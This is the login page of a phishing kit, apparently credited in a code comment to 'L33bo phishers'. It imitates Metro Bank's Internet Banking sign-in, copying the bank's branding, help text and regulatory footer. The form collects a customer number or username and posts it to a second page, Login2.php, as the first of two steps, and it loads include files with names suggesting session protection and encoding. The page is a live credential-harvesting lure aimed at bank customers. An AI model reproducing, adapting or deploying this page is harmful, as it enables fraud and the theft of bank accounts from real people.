<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Login</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<link href="assets/css/cabin-font.css" media="screen" rel="stylesheet" type="text/css">
<link href="assets/css/chosen.css" media="screen" rel="stylesheet" type="text/css">
<link href="assets/css/core_screen.min.css" media="screen" rel="stylesheet" type="text/css">
<link href="assets/css/common.css" media="screen" rel="stylesheet" type="text/css">
<link href="assets/css/jquery-ui.css" media="screen" rel="stylesheet" type="text/css">
<link href="assets/css/jquery-ui-1.8.11.custom.css" media="screen" rel="stylesheet" type="text/css">
<style type="text/css">.accessibilityStyle{position:absolute!important;width:0!important;height:0!important;font-size:0!important;overflow:hidden!important;padding:0!important}.ecDIB{display:-moz-inline-stack;display:inline-block;zoom:1;*display:inline}.ecDIBCol{vertical-align:top}.ui-icon{width:15px!important;height:15px!important}.ui-widget-content{background-image:none!important;background-color:#F2F2F2!important}.ui-corner-top,.ui-corner-bottom,.ui-corner-all{border-radius:3px}.ui-state-default,.ui-widget-content .ui-state-default,.ui-widget-header{border:none;background:#fff;color:#333}.ui-state-default{border:inherit;background:inherit}.ui-state-active,.ui-widget-content .ui-state-active,.ui-widget-header .ui-state-active{border:none;background:#fff;color:#0983c4}.ui-state-default a,.ui-state-default a:link,.ui-state-default a:visited{color:#333}.ui-state-active a,.ui-state-active a:link,.ui-state-active a:visited{color:#0983c4}.ui-accordion .ui-accordion-header a{padding:15px 10px 10px 40px}.ui-accordion .ui-accordion-content{margin-top:0;margin-bottom:0;border-bottom:1px solid #c1c1c1;top:0;padding:0}.ui-widget-content{border:none}.ui-accordion .ui-accordion-header{margin-top:0;margin-bottom:0;border-top:none!important;border-bottom:1px solid #c1c1c1}.HideAccordionButton{width:18px;height:18px;background-image:url(./templates/widgets/jquery-ui/img/RemoveAccord.png);float:right}.ui-widget{font-family:inherit!important;font-size:inherit!important}.ui-widget-header{color:#222;font-weight:700}.ui-widget-content a{color:inherit}.ui-dialog{position:absolute!important;padding:0!important;-webkit-box-shadow:0 3px 10px rgba(0,0,0,0.75);-moz-box-shadow:0 3px 10px rgba(0,0,0,0.75);box-shadow:0 3px 10px rgba(0,0,0,0.75)}.ui-dialog-title{font-size:1.4em;line-height:1.25em;margin:0!important}.ui-dialog-content{padding:0!important}.ui-dialog-titlebar{border-bottom:2px solid #DE1927!important;padding:1.25em 22.5px!important}.ui-dialog-titlebar.ui-corner-all{border-radius:0!important}.ui-widget-overlay{background:none repeat scroll 0 0 #000!important;opacity:.5!important}.dataTables_paginate .ui-button{margin-right:0!important;padding:11px 15px}.ui-widget-header .ui-state-hover{border:0!important;background:none!important}.ui-buttonset{margin-right:0!important}.ui-icon{width:12px;height:12px}.UserError{border-color:#cd0202!important;border-width:3px!important;border-style:solid!important;color:#cd0202!important}</style>
<script>
function letsgo() {
var x = document.forms["form"]["user"].value;
if (x == null || x == "") {
document.getElementById("ErrorBox").style.display = "block";
document.getElementById("user").className = "UserError";
return false;
}
else {
document.getElementById("loader").style.display = "block";
setTimeout(function() {
form.submit();
}, 2000);
return false;
}
}
</script>
</head>
<body class="BrowserWindow" style="margin:0px;">
<form accept-charset="UTF-8" action="Login2.php" autocomplete="off" id="form" method="post" name="form" style="margin:0px;">
<input style="left: -10000px; position: absolute" type="text">
<div id="EDGE_CONNECT_PROCESS" style="clear: both">
<header class="navbarvb fixed">
<div class="navbar-innervb row" style="clear: both;">
<div class="container relative" style="clear: both;">
<div style="clear: both; width: 100%">
<div class="logo column" style="float: left;">
<div>
<div style="clear: left;">
<div style="text-align: left; width:">
<div>&nbsp;</div>
</div>
</div>
</div>
</div>
<div style="float: left;">
<div>
<div class="ec-empty-column">&nbsp;</div>
</div>
</div>
<div class="floatRight" style="float: left;width: 43%;width: 43%;">
<div>
<div style="clear: both;">
<div>
<div style="position: relative">
<div style="width: 100%">
<div style="float: left;">
<div>
<div style="clear: left;">
<div class="floatNone" style="text-align: left; float: left;">
<div>
<style>
a.link:hover{text-decoration:underline!important;color: #0235b4;}
</style>
<a class="header-menu-link fontSizep9em" href="#">Home</a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
<div class="dropdown header-hover-effect" id="COL_E69059C36009800B118607" style="float: left;">
<div>
<div>
<div style="position: relative">
<div></div>
<div>
<div class="dropdown-toggle" style="clear: left;">
<div style="text-align: left; float: left;">
<div><a class="header-menu-link drop-down-indicator fontSizep9em" href="#"><span class="">Our Stores <b class="caret"></b></span></a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="dropdown header-hover-effect" style="float: left;">
<div>
<div>
<div style="position: relative">
<div></div>
<div>
<div class="dropdown-toggle" style="clear: left;">
<div style="text-align: left; float: left;">
<div><a class="header-menu-link drop-down-indicator fontSizep9em" href="#"><span class="">Contact us <b class="caret"></b></span></a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="floatRight" style="float: left;">
<div>
<div style="clear: left;">
<div style="text-align: left; float: left;">
<div>
<style>
a.link:hover{text-decoration:underline!important;color: #0235b4;}
</style>
<a class="header-menu-link fontSizep9em" href="#">Corporate Internet Banking</a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div>
<div id="row_QUE_POPUPMODALHANDLER" style="clear: left;">
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</header>
<div class="navigation-content" style="clear: both;">
<div class="row" style="clear: both;">
<div style="clear: both; width: 100%">
<div class="column grid-6" style="float: left;">
<div>
<div  style="clear: left;">
<div style="float: left;">
<div>
<h3 class="welcome-message">Welcome to Internet Banking</h3>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
<div class="message-container grid-5 floatRight marginTop15px" style="float: left;">
<div>
<div>
<div style="position: relative">
<div class=" message-panel" style="clear: both; width: 120%;">
<div style="clear: both; width: 100%">
<div style="float: left;">
<div>
<div style="clear: left;">
<div style="text-align: left; width:">
<div class="floatLeft"><span aria-hidden="true" data-icon="i"></span></div>
</div>
</div>
</div>
</div>
<div class="floatRight" style="float: left;width: 84%;width: 84%;">
<div>
<div style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: left; ; float: left;float:none;">
<div>
<h4 class="fontWeight600 fontSize1p2em lineHeight1p6em">Great news for savers!</h4>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div style="clear: left;">
<div style="text-align: left; width:">
<div class="lineHeight1p2em">
<div class="floatLeft">You can now send money directly from your Instant Access Savings account to an external account.<br>
<a class="textUnderline send-feeback" href="#">Find out how.</a></div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="row login-content" style="clear: both;">
<div style="clear: both">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: left; width:">
<div>
</div>
</div>
</div>
</div>
<div class="row" style="clear: both;">
<div class="column grid-10 prefix-1" style="clear: both;">
<div style="clear: both; width: 100%">
<div style="float: left;width: 49.0%">
<div>
<div style="clear: left;">
<div style="float: left;display:inline-block;">
<div>
<h3 class="steps">Log in to your account</h3>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
<div class="floatRight" style="float: left;width: 49.0%">
<div>
<div class="ec-empty-column">&nbsp;</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="column grid-10 prefix-1" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="float: left;display:inline-block;">
<div>
<h3 class="steps">Step <span class="badge">1</span> of 2</h3>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="row login-content" style="clear: both;">
<div class="column grid-10 prefix-1" style="clear: both;">
<div style="clear: both;">
<div>
<div style="display: none;position: relative"></div>
</div>
<div>
<div style="display: none;position: relative"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="login-form" style="clear: both;">
<div class="row" style="clear: both;">
<div style="clear: both; width: 100%">
<div class="column grid-5" style="float: left;">
<div>
<div>
<div style="position: relative">
<div class="login-form-container" style="clear: both;">
<div class="form-row" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div class="label UnderlinedQuestion marginBottom1em" style="text-align: left; float: none;">
<div>Please enter your Customer Number or Username<span>&nbsp;<a href="#">What is this?</a></span></div>
</div>
<div class="displayNone" style="text-align: left; ; float: left;">
<div><label for="user">Please enter your Customer Number or Username</label></div>
</div>
<div class="displayNone" style="text-align: left; float: left;">
<div>*</div>
</div>
<div class="displayNone" style="text-align: left; float: left;">
<div>&nbsp;</div>
</div>



<div style="float: left;text-align: left; ; float:none;">
<div><input id="user" maxlength="18" name="user" size="15" style="width:100%" type="text">
</div>
<label class="error-message" for="user" id="ErrorBox" style="display: none;">Please enter either your Customer Number or Username</label>
</div>



<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="link-row" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: left; float: left;">
<div>
<style>
a.link:hover{text-decoration:underline!important;color: #0235b4;}
</style>
<a class="" href="#">Forgotten your Customer Number or Username?</a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="form-row radio" style="clear: both;">
<div style="clear: both">
<div id="row_REMEMBER_ME_CHECKBOX" style="clear: left;">
<div class="displayBlock floatRight CheckBoxQuestionWidth" id="some" style="text-align: left; ; float: left;">
<div><label for="none">Remember me (Don’t tick if you are on a shared computer)</label></div>
</div>
<div class="displayNone" style="text-align: left; float: left;">
<div>&nbsp;</div>
</div>
<div class="displayNone" style="text-align: left; float: left;">
<div>&nbsp;</div>
</div>
<div class="floatLeft" style="float: left;text-align: left; ;">
<div>
<fieldset style="border: none; padding: 0px; margin-left: 0px; display: inline; vertical-align:middle;"><legend class="accessibilityStyle">Remember me (Don’t tick if you are on a shared computer)</legend>
<div style="float: left;"><input id="none" name="noen" type="checkbox" value="1"></div>
</fieldset>
</div>
<label for="none" id="none" style="display: none;"></label></div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="button-row" style="clear: both;">
<div style="clear: both; width: 100%">
<div class="floatRight" style="float: left;">
<div>
<div style="clear: left;">
<div style="float: left;">
<div>


<div id="loader" style="display: none; float: left; text-align:right; height:35px; width:35px;"><img class="loader-30" src="assets/img/loader.gif"></div>


<div style="display: inline">
<button class="primary waitingButton" id="go" name="go" onclick='return letsgo();' style=" cursor: pointer;"  type="button" value="Continue">Continue</button>
</div>


</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="column grid-5" style="float: left;">
<div>
<div class="help-info" style="clear: both;">
<div>
<div style="position: relative">
<div></div>
<div>
<div style="clear: left;">
<div style="float: left;">
<div>
<h4 class="marginBottom1em">First time logging in?</h4>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div style="clear: left;">
<div class="marginBottom1em text-777 fontWeight400" style="text-align: left; float: left;">
<div>You will need these security details to log into your Internet Banking...</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="paddingLeft2em" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div class="marginBottom1em fontWeight600 fontSizep9em" style="text-align: left; float: none;">
<div>• Your Customer Number or Username<span>&nbsp;<a href="#">What is this?</a></span></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div style="clear: left;">
<div class="marginBottom1em fontWeight600 fontSizep9em" style="text-align: left; float: none;">
<div>• Your Password<span>&nbsp;<a href="#">What is this?</a></span></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div style="clear: left;">
<div class="marginBottom1em fontWeight600 fontSizep9em" style="text-align: left; float: none;">
<div>• Your Security Number<span>&nbsp;<a href="#">What is this?</a></span></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div>
<div style="clear: left;">
<div class="marginBottom1em text-777 fontWeight400" style="text-align: left; ; float: left;">
<div>If you have forgotten or are unsure of any of your security details, then <a href="#">click here</a> or please call us on 0345 08 08 500 and we will help you.</div>
</div>
<div style="text-align: left; float: left;">
<div>
<style>
a.link:hover{text-decoration:underline!important;color: #0235b4;}
</style>
<a class="lineHeight_2em" href="#">New to Internet Banking? Register here</a></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<footer>
<div class="row" style="clear: both;">
<div class="column grid-12 talk-to-us" style="clear: both;">
<div>
<div style="position: relative">
<div class="alertvb alert-infovb question-typevb" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: center; ; float: left;float:none;">
<div>
<h3>Any Questions? Please call us on <a href="#">0345 08 08 500</a>, we are here to help.</h3>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="row" style="clear: both;">
<div>
<div style="position: relative">
<div style="width: 100%">
<div class="column grid-4" style="float: left;">
<div>
<div>
<div style="position: relative">
<div class="feature" style="clear: both;">
<header>
<div>
<div style="clear: left;">
<div style="text-align: left; ; float: left;">
<div>
<h5>New Customers</h5>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</header>
<div>
<div style="clear: left;">
<div  style="text-align: left; ; float: left;">
<div>
<p>If you have not already opened an account with us, please <a href="#">click here</a> for information on what you need to open an account.</p>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="column grid-4" style="float: left;">
<div>
<div>
<div style="position: relative">
<div class="feature" style="clear: both;">
<header>
<div>
<div style="clear: left;">
<div style="text-align: left; ; float: left;">
<div>
<h5>Useful help and support</h5>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</header>
<div>
<div style="clear: left;">
<div style="text-align: left; ; float: left;">
<div>
<p>Find <a href="#">useful help and support</a> on how to manage your accounts as well as more information about the Internet Banking service.</p>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
<div class="column grid-4" style="float: left;">
<div>
<div>
<div style="position: relative">
<div class="feature" style="clear: both; height: 81px;">
<header>
<div>
<div style="clear: left;">
<div style="text-align: left; ; float: left;">
<div>
<h5>We take security very seriously</h5>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</header>
<div>
<div style="clear: left;">
<div style="text-align: left; ; float: left;">
<div>
<p>We continuously strive to make banking online safer. To find out more about security <a href="#">click here.</a></p>
<div class="hr" style="padding:0px">
<hr style="display:none"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="row" style="clear: both;">
<div class="column grid-12 small-print" style="clear: both;">
<div style="clear: both">
<div style="clear: left;">
<div style="text-align: left; width:">
<div>
<p>Your eligible deposits with Metro Bank PLC are protected up to a total of £75,000 by the Financial Services Compensation Scheme, the UK's deposit guarantee scheme. Any deposits you hold above the limit are unlikely to be covered. Please <a href="#">click here</a> for further information or visit <a href="#"><b>www.fscs.org.uk.</b></a>.</p>
<p>Metro Bank PLC. Registered in England and Wales. Company number: 6419578. Registered office: One Southampton Row, London, WC1B 5HA. We are authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and Prudential Regulation Authority. Metro Bank PLC is an independent UK Bank - it is not affiliated with any other bank or organisation (including the METRO newspaper or its publishers) anywhere in the world. "Metrobank" is the registered trademark of Metro Bank PLC.</p>
<br>
<em class="no-print">© Metro Bank 2016</em></div>
</div>
</div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</footer>
<div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
</div>
</form>
</body>
</html>